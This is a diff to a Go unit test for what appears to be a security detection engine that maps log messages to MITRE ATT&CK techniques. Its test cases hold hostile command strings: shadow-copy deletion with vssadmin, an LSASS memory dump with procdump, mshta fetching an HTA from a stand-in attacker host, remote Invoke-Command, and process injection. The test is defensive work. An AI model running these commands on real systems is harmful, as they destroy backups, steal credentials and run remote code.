@@ -240,6 +240,10 @@ func TestDefaultRulesCoverNewEventTypes(t *testing.T) {
 		{"SECURITY", "fidye notu bulundu: README_DECRYPT.txt — dosyalar .encrypted", "T1486"},
 		{"SECURITY", "vssadmin delete shadows /all /quiet çalıştırıldı", "T1490"},
 		{"SECURITY", "procdump -ma lsass.exe lsass.dmp (credential dump)", "T1003"},
+		// v4: panelde boş kalan taktik hücreleri (defense-evasion/lateral/injection).
+		{"PROCESS", "mshta.exe http://evil.example/x.hta", "T1218"},
+		{"SECURITY", "Invoke-Command -ComputerName DC01 -ScriptBlock {calc}", "T1021"},
+		{"PROCESS", "CreateRemoteThread + VirtualAllocEx into explorer.exe", "T1055"},
 	}
 	for _, c := range cases {
 		dets := e.Evaluate(model.Event{Category: c.cat, Severity: "HIGH", Message: c.msg})
